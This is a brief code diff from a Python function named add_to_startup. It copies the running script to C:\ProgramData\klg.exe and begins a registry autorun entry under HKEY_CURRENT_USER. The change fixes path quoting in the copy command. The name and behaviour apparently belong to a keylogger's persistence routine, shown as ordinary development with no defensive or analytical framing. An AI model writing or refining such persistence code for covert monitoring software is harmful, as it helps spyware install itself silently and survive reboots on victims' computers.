@@ -75,7 +75,7 @@ def add_to_startup():
     script_path = path.realpath(argv[0])
     bat_path = "C:\\ProgramData\\klg.exe"
 
-    cmd(f"copy {script_path} {bat_path}")
+    cmd(f'copy "{script_path}" "{bat_path}"')
 
     # Create the batch file to run the script
     key = HKEY_CURRENT_USER
